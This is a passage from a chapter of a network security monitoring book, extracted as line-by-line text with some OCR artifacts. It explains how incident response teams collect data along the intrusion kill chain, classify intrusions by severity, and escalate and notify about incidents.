- en: are often crucial. Users trained to be aware of phishing activity can be a
  prefs: []
  type: TYPE_NORMAL
- en: key aspect of enterprise defense. The user who reports a failed phishing
  prefs: []
  type: TYPE_NORMAL
- en: attempt may provide the warning and evidence needed to detect when that
  prefs: []
  type: TYPE_NORMAL
- en: same attempt succeeded against another victim.
  prefs: []
  type: TYPE_NORMAL
- en: '**whaT DaTa ShoulD you collecT?**'
  prefs: []
  type: TYPE_NORMAL
- en: This book recommends collecting several classes of network-centric data . This
  prefs: []
  type: TYPE_NORMAL
- en: NSM data includes full content, extracted content, session data, transaction
  prefs: []
  type: TYPE_NORMAL
- en: data, statistical data, metadata, and alert data . Is al that necessary? How
  prefs: []
  type: TYPE_NORMAL
- en: should a CIRT decide what data to col ect to improve its chances of detecting
  prefs: []
  type: TYPE_NORMAL
- en: and responding to all sorts of digital intruders?
  prefs: []
  type: TYPE_NORMAL
- en: Eric M . Hutchins, Michael J . Cloppert, and Rohan M . Amin offer one model
  prefs: []
  type: TYPE_NORMAL
- en: to help answer this question in their landmark paper “Intel igence-Driven Com-
  prefs: []
  type: TYPE_NORMAL
- en: puter Network Defense Informed by Analysis of Adversary Campaigns and
  prefs: []
  type: TYPE_NORMAL
- en: Intrusion Kill Chains” ( *ht p://papers.rohanamin.com/wp-content/uploads/papers*
  prefs: []
  type: TYPE_NORMAL
- en: '*.rohanamin.com/2011/08/iciw2011.pdf* ) . In this paper (and in talks at conferences),
    they outline the steps an intruder takes when exercising a certain set of'
  prefs: []
  type: TYPE_NORMAL
- en: tactics, techniques, and procedures (TTPs, a term borrowed from the US military
  prefs: []
  type: TYPE_NORMAL
- en: to characterize intruder activity) . Although the authors developed their model
    to
  prefs: []
  type: TYPE_NORMAL
- en: counter advanced persistent threat (APT) TTPs,
  prefs: []
  type: TYPE_NORMAL
- en: this general form of analysis can be adapted to
  prefs: []
  type: TYPE_NORMAL
- en: Intrusion Kill Chain
  prefs: []
  type: TYPE_NORMAL
- en: suit other actors and other methods . (For more
  prefs: []
  type: TYPE_NORMAL
- en: information on the APT, see Mandiant’s report at
  prefs: []
  type: TYPE_NORMAL
- en: Reconnaissance
  prefs: []
  type: TYPE_NORMAL
- en: '*ht p://www.mandiant.com/apt1/* .) Their model'
  prefs: []
  type: TYPE_NORMAL
- en: appears in Figure 9-3, and is referenced in
  prefs: []
  type: TYPE_NORMAL
- en: Weaponization
  prefs: []
  type: TYPE_NORMAL
- en: their paper as an *intrusion kil chain* .
  prefs: []
  type: TYPE_NORMAL
- en: Delivery
  prefs: []
  type: TYPE_NORMAL
- en: This series of steps resembles the process
  prefs: []
  type: TYPE_NORMAL
- en: discussed in previous works, such as the “phases
  prefs: []
  type: TYPE_NORMAL
- en: Exploitation
  prefs: []
  type: TYPE_NORMAL
- en: of compromise” in my first book *The Tao of*
  prefs: []
  type: TYPE_NORMAL
- en: '*Network Security Monitoring: Beyond Intrusion*'
  prefs: []
  type: TYPE_NORMAL
- en: Installation
  prefs: []
  type: TYPE_NORMAL
- en: '*Detection* (Addison-Wesley, 2004): (1) recon-'
  prefs: []
  type: TYPE_NORMAL
- en: Command and control
  prefs: []
  type: TYPE_NORMAL
- en: naissance, (2) exploitation, (3) reinforce-
  prefs: []
  type: TYPE_NORMAL
- en: ment, (4) consolidation, and (5) pil age . The
  prefs: []
  type: TYPE_NORMAL
- en: Actions on intent
  prefs: []
  type: TYPE_NORMAL
- en: “anatomy of a hack” from *Hacking Exposed,*
  prefs: []
  type: TYPE_NORMAL
- en: '*Fourth Edition* (McGraw-Hill Osborne Media,'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 9-3: Intrusion kill*'
  prefs: []
  type: TYPE_NORMAL
- en: '2003) is similar: (1) footprinting, (2) scanning,'
  prefs: []
  type: TYPE_NORMAL
- en: '*chain model*'
  prefs: []
  type: TYPE_NORMAL
- en: '**190** Chapter 9'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: (3) enumeration, (4) gaining access, (5) escalating privilege, (6) pilfering,
    (7) covering tracks, (8) creating backdoors . Others have their own versions
  prefs: []
  type: TYPE_NORMAL
- en: of the steps taken by an adversary when compromising a target .
  prefs: []
  type: TYPE_NORMAL
- en: What makes the approach offered by Hutchins, Cloppert, and Amin unique
  prefs: []
  type: TYPE_NORMAL
- en: is its focus on aligning one’s security program with the steps in the intrusion
  prefs: []
  type: TYPE_NORMAL
- en: kill chain . They show example technologies to detect, deny, disrupt, degrade,
  prefs: []
  type: TYPE_NORMAL
- en: and/or deceive the adversary . NSM fits this model wel , because it provides
    a
  prefs: []
  type: TYPE_NORMAL
- en: way to detect and respond to intruders before they accomplish their mission
    .
  prefs: []
  type: TYPE_NORMAL
- en: Therefore, the intrusion kill chain offers a powerful model for identifying
    the
  prefs: []
  type: TYPE_NORMAL
- en: data we need to col ect .
  prefs: []
  type: TYPE_NORMAL
- en: The most robust NSM operation will have a detection method for each
  prefs: []
  type: TYPE_NORMAL
- en: step in the intrusion kill chain, with data sources that vary according to the
    net-
  prefs: []
  type: TYPE_NORMAL
- en: work . Figure 9-4 shows the intrusion kill chain with sample data sources, includ-
  prefs: []
  type: TYPE_NORMAL
- en: ing host, network, application, and nontechnical .
  prefs: []
  type: TYPE_NORMAL
- en: Intrusion Kill Chain
  prefs: []
  type: TYPE_NORMAL
- en: Detection Method
  prefs: []
  type: TYPE_NORMAL
- en: Reconnaissance
  prefs: []
  type: TYPE_NORMAL
- en: Web access logs
  prefs: []
  type: TYPE_NORMAL
- en: Weaponization
  prefs: []
  type: TYPE_NORMAL
- en: Extracted content
  prefs: []
  type: TYPE_NORMAL
- en: Delivery
  prefs: []
  type: TYPE_NORMAL
- en: User report
  prefs: []
  type: TYPE_NORMAL
- en: Exploitation
  prefs: []
  type: TYPE_NORMAL
- en: Endpoint assessment
  prefs: []
  type: TYPE_NORMAL
- en: Installation
  prefs: []
  type: TYPE_NORMAL
- en: Endpoint assessment
  prefs: []
  type: TYPE_NORMAL
- en: Command and control
  prefs: []
  type: TYPE_NORMAL
- en: Transaction data
  prefs: []
  type: TYPE_NORMAL
- en: Actions on intent
  prefs: []
  type: TYPE_NORMAL
- en: Memory analysis
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 9-4: Intrusion kill chain and possible detection*'
  prefs: []
  type: TYPE_NORMAL
- en: '*sources and methods*'
  prefs: []
  type: TYPE_NORMAL
- en: To understand Figure 9-4, suppose that an intruder wants to compromise
  prefs: []
  type: TYPE_NORMAL
- en: a certain company in order to steal data . He decides to conduct a spear phish-
  prefs: []
  type: TYPE_NORMAL
- en: ing attack to gain initial access to the target . To identify users at the company,
  prefs: []
  type: TYPE_NORMAL
- en: he downloads all documents from the company’s website that contain email
  prefs: []
  type: TYPE_NORMAL
- en: addresses of company users . The intruder crafts an enticing phishing email,
  prefs: []
  type: TYPE_NORMAL
- en: inserts exploit code into an at achment, and transmits the malicious message
    to a
  prefs: []
  type: TYPE_NORMAL
- en: set of users at the company . Once a victim user clicks the malicious attachment,
  prefs: []
  type: TYPE_NORMAL
- en: which is malware that will exploit a vulnerability in the user’s word processing
  prefs: []
  type: TYPE_NORMAL
- en: application, the malware establishes an outbound command-and-control chan-
  prefs: []
  type: TYPE_NORMAL
- en: nel to a site control ed by the intruder . At that point, the intruder is ready
    to
  prefs: []
  type: TYPE_NORMAL
- en: begin looking for the data he wants to steal .
  prefs: []
  type: TYPE_NORMAL
- en: '*(continued)*'
  prefs: []
  type: TYPE_NORMAL
- en: NSM Operations **191**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 9-4 shows how various sources and methods could be used to
  prefs: []
  type: TYPE_NORMAL
- en: detect each phase of the intrusion kill chain . The CIRT could analyze access
  prefs: []
  type: TYPE_NORMAL
- en: logs to detect an intruder using a search engine to find email addresses on
    the
  prefs: []
  type: TYPE_NORMAL
- en: company’s website . As the phishing message passes through the company’s
  prefs: []
  type: TYPE_NORMAL
- en: email servers, automated processing software could extract the malicious at
    ach-
  prefs: []
  type: TYPE_NORMAL
- en: ment and analyze it for suspicious features . One or more recipients of the
    phish-
  prefs: []
  type: TYPE_NORMAL
- en: ing message could report receiving it .
  prefs: []
  type: TYPE_NORMAL
- en: The CIRT could use an endpoint assessment tool to find indicators of com-
  prefs: []
  type: TYPE_NORMAL
- en: promise created by the exploitation of a vulnerable word processing applica-
  prefs: []
  type: TYPE_NORMAL
- en: tion and the instal ation of malware that fol ows . The CIRT could observe the
  prefs: []
  type: TYPE_NORMAL
- en: command-and-control channel in transaction data col ected by its SO platform
    .
  prefs: []
  type: TYPE_NORMAL
- en: Final y, to see individual commands executed by the intruder, the CIRT might
  prefs: []
  type: TYPE_NORMAL
- en: analyze memory captured from one or more victim systems .
  prefs: []
  type: TYPE_NORMAL
- en: These sample detection sources and methods will not be available to all
  prefs: []
  type: TYPE_NORMAL
- en: organizations . You may need to rely more heavily on the tools you have avail-
  prefs: []
  type: TYPE_NORMAL
- en: able . It is likely that at the start of the NSM journey, many CIRTs will see
    gaps
  prefs: []
  type: TYPE_NORMAL
- en: in their ability to detect all phases of the intrusion kill chain . Smart CIRTs
    will
  prefs: []
  type: TYPE_NORMAL
- en: work to meet those gaps, using a combination of technical and nontechnical
  prefs: []
  type: TYPE_NORMAL
- en: methods, and they will build countermeasures to try to deny, disrupt, degrade,
  prefs: []
  type: TYPE_NORMAL
- en: and/or deceive the adversary . Not all measures will work against all attack
  prefs: []
  type: TYPE_NORMAL
- en: methods, but resisting or detecting “higher” up in the chain (that is, earlier)
  prefs: []
  type: TYPE_NORMAL
- en: gives the defender the best chance to prevent the adversary from accomplish-
  prefs: []
  type: TYPE_NORMAL
- en: ing his mission .
  prefs: []
  type: TYPE_NORMAL
- en: The bottom line is that collection requires several components in order
  prefs: []
  type: TYPE_NORMAL
- en: 'to be effective. These include:'
  prefs: []
  type: TYPE_NORMAL
- en: • Data from the host, network, and applications forms the technical
  prefs: []
  type: TYPE_NORMAL
- en: foundation
  prefs: []
  type: TYPE_NORMAL
- en: • A process to accept reports from third parties and constituents to
  prefs: []
  type: TYPE_NORMAL
- en: gather nontechnical data
  prefs: []
  type: TYPE_NORMAL
- en: • A database, ticketing system, or other platform to manage this
  prefs: []
  type: TYPE_NORMAL
- en: information
  prefs: []
  type: TYPE_NORMAL
- en: We’ve discussed SO as one technical tool for data collection, but it’s not
  prefs: []
  type: TYPE_NORMAL
- en: the only method available. Your organization can use email, help desk staff,
  prefs: []
  type: TYPE_NORMAL
- en: and related processes to manage the nontechnical collection duties.
  prefs: []
  type: TYPE_NORMAL
- en: Some organizations end the NSM process at the collection phase. They
  prefs: []
  type: TYPE_NORMAL
- en: regard NSM collection tools and techniques as yet another set of systems
  prefs: []
  type: TYPE_NORMAL
- en: to deploy and discard. They view collection as the end itself, instead of a
  prefs: []
  type: TYPE_NORMAL
- en: means to an end. Don’t get caught in this trap! While well-instrumented
  prefs: []
  type: TYPE_NORMAL
- en: networks are rare, take the next step and do something with the data.
  prefs: []
  type: TYPE_NORMAL
- en: Enter the analysis phase.
  prefs: []
  type: TYPE_NORMAL
- en: '**192** Chapter 9'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '***Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: Analysis is the process of identifying and validating normal, suspicious, and
  prefs: []
  type: TYPE_NORMAL
- en: malicious activity. IOCs expedite this process. Formally, IOCs are manifes-
  prefs: []
  type: TYPE_NORMAL
- en: tations of observable or discernible adversary actions. Informally, IOCs are
  prefs: []
  type: TYPE_NORMAL
- en: ways to codify adversary activity so that technical systems can find intruders
  prefs: []
  type: TYPE_NORMAL
- en: in digital evidence. For example, the Mandiant APT1 report ( *http://www*
  prefs: []
  type: TYPE_NORMAL
- en: '*.mandiant.com/apt1/*) released in February 2013 listed more than 3,000 IOCs,'
  prefs: []
  type: TYPE_NORMAL
- en: including IP addresses, domain names, and MD5 hashes of tools used by
  prefs: []
  type: TYPE_NORMAL
- en: Unit 61398 of the People’s Liberation Army. (Mandiant identifies certain
  prefs: []
  type: TYPE_NORMAL
- en: threat groups with the prefix APT, followed by a number, such as APT1,
  prefs: []
  type: TYPE_NORMAL
- en: APT2, and so on.)
  prefs: []
  type: TYPE_NORMAL
- en: I refer to relying on IOCs to find intruders as *IOC-centric analysis*, or
  prefs: []
  type: TYPE_NORMAL
- en: '*matching*. Analysts match IOCs to evidence to identify suspicious or mali-'
  prefs: []
  type: TYPE_NORMAL
- en: cious activity, and then validate their findings.
  prefs: []
  type: TYPE_NORMAL
- en: Matching is not the only way to find intruders. More advanced NSM
  prefs: []
  type: TYPE_NORMAL
- en: operations also pursue *IOC-free analysis*, or *hunting*.
  prefs: []
  type: TYPE_NORMAL
- en: In the mid-2000s, the US Air Force popularized the term *hunter-killer* in
  prefs: []
  type: TYPE_NORMAL
- en: the digital world. Security experts performed *friendly force projection* on
    their networks, examining data and sometimes occupying the systems themselves
  prefs: []
  type: TYPE_NORMAL
- en: in order to find advanced threats. Today, NSM professionals like David Bianco
  prefs: []
  type: TYPE_NORMAL
- en: ( *http://detect-respond.blogspot.com/*) and Aaron Wade ( *http://forensicir.blogspot*
  prefs: []
  type: TYPE_NORMAL
- en: '*.com/*) promote network “hunting trips,” during which a senior investigator'
  prefs: []
  type: TYPE_NORMAL
- en: with a novel way to detect intruders guides junior analysts through data and
  prefs: []
  type: TYPE_NORMAL
- en: systems looking for signs of the adversary. Upon validating the technique (and
  prefs: []
  type: TYPE_NORMAL
- en: responding to any enemy actions), the hunters incorporate the new detection
  prefs: []
  type: TYPE_NORMAL
- en: method into a CIRT’s IOC-centric operations. (Chapters 10 and 11 contrast
  prefs: []
  type: TYPE_NORMAL
- en: the matching and hunting methodologies to demonstrate the strengths and
  prefs: []
  type: TYPE_NORMAL
- en: weaknesses of each.)
  prefs: []
  type: TYPE_NORMAL
- en: '**Intrusions and Incidents**'
  prefs: []
  type: TYPE_NORMAL
- en: Analysts use data to identify and validate intrusions. Intrusions are one
  prefs: []
  type: TYPE_NORMAL
- en: example of an incident. Other examples of incidents include disruption
  prefs: []
  type: TYPE_NORMAL
- en: caused by DDoS attacks, the loss or theft of a mobile device, and lost con-
  prefs: []
  type: TYPE_NORMAL
- en: nectivity due to a severed network cable. But just what is an *intrusion*, and
  prefs: []
  type: TYPE_NORMAL
- en: what is an *incident*?
  prefs: []
  type: TYPE_NORMAL
- en: '*Intrusions* are policy violations or computer security incidents. In their'
  prefs: []
  type: TYPE_NORMAL
- en: book, *Incident Response and Computer Forensics, Second Edition* (McGraw-Hill
  prefs: []
  type: TYPE_NORMAL
- en: Osborne Media, 2003), Kevin Mandia and Chris Prosise define an *incident*
  prefs: []
  type: TYPE_NORMAL
- en: as “any unlawful, unauthorized, or unacceptable action that involves a
  prefs: []
  type: TYPE_NORMAL
- en: computer system or a computer network.” These definitions leave plenty
  prefs: []
  type: TYPE_NORMAL
- en: of room to maneuver, and your organization should decide what these
  prefs: []
  type: TYPE_NORMAL
- en: terms mean to you. Your goal should be to adopt internally consistent
  prefs: []
  type: TYPE_NORMAL
- en: definitions. For example, Figure 9-5 depicts a classification method
  prefs: []
  type: TYPE_NORMAL
- en: ( *http://taosecurity.blogspot.com/2009/06/information-security-incident.html*
    and *http://taosecurity.blogspot.com/2009/06/extending-information-security-incident*
  prefs: []
  type: TYPE_NORMAL
- en: '*.html*) that builds on a subset of intrusion categories, or *cat* levels,
    as popularized by the US Department of Defense.'
  prefs: []
  type: TYPE_NORMAL
- en: NSM Operations **193**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Name
  prefs: []
  type: TYPE_NORMAL
- en: Description
  prefs: []
  type: TYPE_NORMAL
- en: Cat 6
  prefs: []
  type: TYPE_NORMAL
- en: Intruder conducted reconnaissance against asset with access to sensitive data.
  prefs: []
  type: TYPE_NORMAL
- en: Cat 3
  prefs: []
  type: TYPE_NORMAL
- en: Intruder tried to exploit asset with access to sensitive data, but failed.
  prefs: []
  type: TYPE_NORMAL
- en: Cat 2
  prefs: []
  type: TYPE_NORMAL
- en: Intruder compromised asset with access to sensitive data but did not obtain
  prefs: []
  type: TYPE_NORMAL
- en: root- or administrator-level access.
  prefs: []
  type: TYPE_NORMAL
- en: Cat 1
  prefs: []
  type: TYPE_NORMAL
- en: Intruder compromised asset with ready access to sensitive data.
  prefs: []
  type: TYPE_NORMAL
- en: Breach 3 Intruder established command-and-control channel from asset with ready
  prefs: []
  type: TYPE_NORMAL
- en: access to sensitive data.
  prefs: []
  type: TYPE_NORMAL
- en: Breach 2 Intruder exfiltrated nonsensitive data or data that will facilitate
    access to sensitive data.
  prefs: []
  type: TYPE_NORMAL
- en: Breach 1 Intruder exfiltrated sensitive data or is suspected of exfiltrating
    sensitive data based on volume, etc.
  prefs: []
  type: TYPE_NORMAL
- en: Crisis 3 Intruder publicized stolen data online or via mainstream media.
  prefs: []
  type: TYPE_NORMAL
- en: Crisis 2 Data loss prompted government or regulatory investigation with fines
    or other legal consequences.
  prefs: []
  type: TYPE_NORMAL
- en: Crisis 1 Data loss resulted in physical harm or loss of life.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 9-5: Suggested intrusion categories*'
  prefs: []
  type: TYPE_NORMAL
- en: These categories are designed to help the analyst understand the out-
  prefs: []
  type: TYPE_NORMAL
- en: come and nature of an intrusion. For example, say an analyst determines
  prefs: []
  type: TYPE_NORMAL
- en: that an intruder compromised a computer by executing unauthorized
  prefs: []
  type: TYPE_NORMAL
- en: code, perhaps by tricking a user into opening a malicious attachment that
  prefs: []
  type: TYPE_NORMAL
- en: exploited a vulnerable Java installation. However, if the analyst further
  prefs: []
  type: TYPE_NORMAL
- en: determines that the outbound command-and-control channel was denied
  prefs: []
  type: TYPE_NORMAL
- en: by the enterprise proxy, the intrusion is classified as a Cat 1\. Because the
  prefs: []
  type: TYPE_NORMAL
- en: intruder could not establish his command-and-control channel, the inci-
  prefs: []
  type: TYPE_NORMAL
- en: dent falls short of a Breach 3\.
  prefs: []
  type: TYPE_NORMAL
- en: As another example, suppose that an analyst finds that an intruder has
  prefs: []
  type: TYPE_NORMAL
- en: compromised a computer by executing unauthorized code on the target. In
  prefs: []
  type: TYPE_NORMAL
- en: this case, the intruder has also *exfiltrated*, or stolen, nonsensitive data,
    such as a user’s shopping list. If the CIRT acts quickly, it can contain the victim
  prefs: []
  type: TYPE_NORMAL
- en: before the intruder steals sensitive data, or pivots from the initial victim
  prefs: []
  type: TYPE_NORMAL
- en: to another victim’s system. If the CIRT succeeds, the incident is a Breach 2\.
  prefs: []
  type: TYPE_NORMAL
- en: If the CIRT fails, and the intruder steals sensitive data, the incident is a
  prefs: []
  type: TYPE_NORMAL
- en: Breach 1\. If the intruder chooses to publish the stolen data online, the inci-
  prefs: []
  type: TYPE_NORMAL
- en: dent is a Crisis 3\.
  prefs: []
  type: TYPE_NORMAL
- en: '**194** Chapter 9'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Event Classification**'
  prefs: []
  type: TYPE_NORMAL
- en: CIRTs may classify incidents within their analysis console or via an incident
  prefs: []
  type: TYPE_NORMAL
- en: tracking system. For example, the open source Sguil and Snorby consoles
  prefs: []
  type: TYPE_NORMAL
- en: (discussed in Chapter 8) support incident classification using function keys.
  prefs: []
  type: TYPE_NORMAL
- en: Other options include labeling results in Security Information and Event
  prefs: []
  type: TYPE_NORMAL
- en: Management (SIEM) or log management platforms.
  prefs: []
  type: TYPE_NORMAL
- en: Classification should include the user ID of the analyst making the deci-
  prefs: []
  type: TYPE_NORMAL
- en: sion, the time of the classification, the classification itself, and an optional
  prefs: []
  type: TYPE_NORMAL
- en: comments field. Systems that support forwarding events to more senior
  prefs: []
  type: TYPE_NORMAL
- en: analysts are helpful. Collaboration and social discussions of incident data
  prefs: []
  type: TYPE_NORMAL
- en: (such as tagging, chatrooms, and forums) help improve the decision-
  prefs: []
  type: TYPE_NORMAL
- en: making process.
  prefs: []
  type: TYPE_NORMAL
- en: The bottom line for the analysis process is that analysts must count and
  prefs: []
  type: TYPE_NORMAL
- en: classify all incidents that affect their constituents. Counting and classifying
  prefs: []
  type: TYPE_NORMAL
- en: incidents creates one of the two key metrics any CIRT must collect. (The
  prefs: []
  type: TYPE_NORMAL
- en: second key metric is the time elapsed from incident detection to contain-
  prefs: []
  type: TYPE_NORMAL
- en: ment, as discussed in “Resolution” o[n page 198\.](#p232) ) The definitions
    do not need to conform to any international standard, but they must be internally
  prefs: []
  type: TYPE_NORMAL
- en: consistent.
  prefs: []
  type: TYPE_NORMAL
- en: That said, if a CIRT wants to contribute data to an incident-reporting
  prefs: []
  type: TYPE_NORMAL
- en: project, the CIRT must align its incident definitions with that of the outside
  prefs: []
  type: TYPE_NORMAL
- en: body. Whether reporting internally or externally, CIRTs should be able to
  prefs: []
  type: TYPE_NORMAL
- en: produce regular reports on the number and types of incidents per unit
  prefs: []
  type: TYPE_NORMAL
- en: time, such as per quarter or per year. What the organization does with the
  prefs: []
  type: TYPE_NORMAL
- en: output of the analysis process is the topic of the next section.
  prefs: []
  type: TYPE_NORMAL
- en: '***Escalation***'
  prefs: []
  type: TYPE_NORMAL
- en: Escalation refers to the process the CIRT uses to document its findings,
  prefs: []
  type: TYPE_NORMAL
- en: notify its constituents, and receive acknowledgment from the constituents
  prefs: []
  type: TYPE_NORMAL
- en: of the incident report. Escalation may seem like an afterthought, unwor-
  prefs: []
  type: TYPE_NORMAL
- en: thy of its own section, but in large and/or distributed environments, esca-
  prefs: []
  type: TYPE_NORMAL
- en: lation is one of the most difficult aspects of the NSM process.
  prefs: []
  type: TYPE_NORMAL
- en: '**Documentation of Incidents**'
  prefs: []
  type: TYPE_NORMAL
- en: Documentation creates a record of an event, as well as the CIRT’s work to
  prefs: []
  type: TYPE_NORMAL
- en: handle that event. It’s important to assign a single incident number to each
  prefs: []
  type: TYPE_NORMAL
- en: victim computer. (Consider exploited applications to be computers for the
  prefs: []
  type: TYPE_NORMAL
- en: purposes of this exercise.) Do not assign multiple compromised computers to
  prefs: []
  type: TYPE_NORMAL
- en: a single incident number, unless you use a different term for a single compro-
  prefs: []
  type: TYPE_NORMAL
- en: mised computer. For example, some CIRTs call a single victim a *compromise*,
  prefs: []
  type: TYPE_NORMAL
- en: and one or more compromised computers an *incident*. The point is to use a
  prefs: []
  type: TYPE_NORMAL
- en: granular term that applies to a single victim computer; without such detail,
    it
  prefs: []
  type: TYPE_NORMAL
- en: becomes impossible to collect and measure incident response metrics.
  prefs: []
  type: TYPE_NORMAL
- en: NSM Operations **195**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Organizations will choose to incorporate different levels of detail into their
    incident reports. For example, CIRTs handling hundreds or thousands
  prefs: []
  type: TYPE_NORMAL
- en: of incidents per year will likely capture the essential details of a victim
    system,
  prefs: []
  type: TYPE_NORMAL
- en: while those working with fewer incidents might document in more detail.
  prefs: []
  type: TYPE_NORMAL
- en: When possible, consider documenting incidents using a community
  prefs: []
  type: TYPE_NORMAL
- en: standard like the Vocabulary for Event Recording and Incident Sharing
  prefs: []
  type: TYPE_NORMAL
- en: (VERIS). VERIS provides a common language for describing security inci-
  prefs: []
  type: TYPE_NORMAL
- en: dents consistently. You’ll find examples of how to document incidents of
  prefs: []
  type: TYPE_NORMAL
- en: various types posted at the VERIS project site ( *http://veriscommunity.net/*).
  prefs: []
  type: TYPE_NORMAL
- en: '**Notification of Incidents**'
  prefs: []
  type: TYPE_NORMAL
- en: Notification is the next step in the escalation process. It requires you to
  prefs: []
  type: TYPE_NORMAL
- en: identify the compromised asset, find a person or group responsible for the
  prefs: []
  type: TYPE_NORMAL
- en: victim, and deliver an incident report to the affected party. The process
  prefs: []
  type: TYPE_NORMAL
- en: may sound easy, but it can be exceptionally difficult when working with
  prefs: []
  type: TYPE_NORMAL
- en: large or distributed networks due to the generally poor state of inventory
  prefs: []
  type: TYPE_NORMAL
- en: management and network visibility that afflicts many organizations.
  prefs: []
  type: TYPE_NORMAL
- en: '**whaT iS a DefeNSiBle NeT work archiTecTure?**'
  prefs: []
  type: TYPE_NORMAL
- en: Identifying a compromised asset, finding a responsible owner, and delivering
    an
  prefs: []
  type: TYPE_NORMAL
- en: incident report are three of the toughest jobs in security, but they are not
    the only chal enges . I developed a *defensible network architecture* to explain
    the characteristics of organizations whose network offers the greatest overall
    security ( *ht p://*
  prefs: []
  type: TYPE_NORMAL
- en: '*taosecurity.blogspot.com/2008/01/defensible-network-architecture-20 .html*
    ) . The list starts with the characteristics a security team should adopt first,
    and as it continues, the elements become progressively more difficult to implement
    .'
  prefs: []
  type: TYPE_NORMAL
- en: monitored CIRTs can view all assets at the host, network, and application
  prefs: []
  type: TYPE_NORMAL
- en: log levels .
  prefs: []
  type: TYPE_NORMAL
- en: Inventoried CIRTs can access an inventory identifying asset location, purpose,
  prefs: []
  type: TYPE_NORMAL
- en: data classification, criticality, owner, and contact method .
  prefs: []
  type: TYPE_NORMAL
- en: control ed The security team enforces access control at the host, network, and
  prefs: []
  type: TYPE_NORMAL
- en: application levels to permit authorized activities and deny everything else
    .
  prefs: []
  type: TYPE_NORMAL
- en: claimed The asset owner listed in the inventory exerts active control of the
    system .
  prefs: []
  type: TYPE_NORMAL
- en: minimized The assets provide the minimum surface area required to perform
  prefs: []
  type: TYPE_NORMAL
- en: their business function; unnecessary services, protocols, and software are disabled
    .
  prefs: []
  type: TYPE_NORMAL
- en: assessed The CIRT routinely evaluates the configuration of the assets to deter-
  prefs: []
  type: TYPE_NORMAL
- en: mine their security posture .
  prefs: []
  type: TYPE_NORMAL
- en: current The IT team keeps the assets patch status and configuration up-to-date
  prefs: []
  type: TYPE_NORMAL
- en: with the latest standards .
  prefs: []
  type: TYPE_NORMAL
- en: measured The IT team and CIRT measure their progress against the previous
  prefs: []
  type: TYPE_NORMAL
- en: steps .
  prefs: []
  type: TYPE_NORMAL
- en: Organizations that adopt a defensible network architecture are best posi-
  prefs: []
  type: TYPE_NORMAL
- en: tioned to resist compromise and to respond effectively to intrusions as they
    occur .
  prefs: []
  type: TYPE_NORMAL
- en: '**196** Chapter 9'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Notification is impossible if the CIRT cannot map an IP address or
  prefs: []
  type: TYPE_NORMAL
- en: hostname to a real computer, determine its owner, and contact the owner.
  prefs: []
  type: TYPE_NORMAL
- en: If any of these steps fail, the incident remains unreported and the network
  prefs: []
  type: TYPE_NORMAL
- en: at risk.
  prefs: []
  type: TYPE_NORMAL
- en: Notification also depends on the risk posed by a particular incident.
  prefs: []
  type: TYPE_NORMAL
- en: For example, communications about a Cat 2 incident (unauthorized user-
  prefs: []
  type: TYPE_NORMAL
- en: level access) should probably not carry the urgency of communications
  prefs: []
  type: TYPE_NORMAL
- en: about a Breach 2 incident (intruder has stolen sensitive data).
  prefs: []
  type: TYPE_NORMAL
- en: Regardless, all reporting should be in accord with the standard inci-
  prefs: []
  type: TYPE_NORMAL
- en: dent management platform used by the CIRT, but the CIRT and constituents
  prefs: []
  type: TYPE_NORMAL
- en: should agree to different expected response times based on the severity of
  prefs: []
  type: TYPE_NORMAL
- en: incidents. If an incident is urgent, use the telephone or instant messaging;
  prefs: []
  type: TYPE_NORMAL
- en: time is a crucial component in that case. Be sure that everyone understands
  prefs: []
  type: TYPE_NORMAL
- en: how to communicate about incidents and practice the process of notifica-
  prefs: []
  type: TYPE_NORMAL
- en: tion regularly. At the same time, form backup notification plans in case the
  prefs: []
  type: TYPE_NORMAL
- en: primary contacts are unresponsive.
  prefs: []
  type: TYPE_NORMAL
- en: Acknowledgment of the incident report is the final step in the escala-
  prefs: []
  type: TYPE_NORMAL
- en: tion phase, but this step can be a challenge because some constituents
  prefs: []
  type: TYPE_NORMAL
- en: don’t care to know that their computers are compromised (or they’re just
  prefs: []
  type: TYPE_NORMAL
- en: swamped with other work). Others have no IT or security abilities whatso-
  prefs: []
  type: TYPE_NORMAL
- en: ever and may depend completely on the CIRT for the next steps. Whatever
  prefs: []
  type: TYPE_NORMAL
- en: the case, track the acknowledgment time and method in whatever system
  prefs: []
  type: TYPE_NORMAL
- en: you use to manage incident reporting to help improve the overall security
  prefs: []
  type: TYPE_NORMAL
- en: process.
  prefs: []
  type: TYPE_NORMAL
- en: '**Incident Communication Considerations**'
  prefs: []
  type: TYPE_NORMAL
- en: Organizations compromised by persistent threats should assume that the
  prefs: []
  type: TYPE_NORMAL
- en: adversary has access to their email. Reading CIRT and security team mes-
  prefs: []
  type: TYPE_NORMAL
- en: sages is a favorite attacker pastime. Unfortunately, email is often the least
  prefs: []
  type: TYPE_NORMAL
- en: common denominator when it comes to enterprise communication. Large,
  prefs: []
  type: TYPE_NORMAL
- en: distributed organizations may have different chat applications, collabora-
  prefs: []
  type: TYPE_NORMAL
- en: tion platforms, or other forms of communication, but most everyone has
  prefs: []
  type: TYPE_NORMAL
- en: an email address that they monitor closely. Make sure to encrypt sensi-
  prefs: []
  type: TYPE_NORMAL
- en: tive CIRT-to-constituent email conversations and exchange truly sensitive
  prefs: []
  type: TYPE_NORMAL
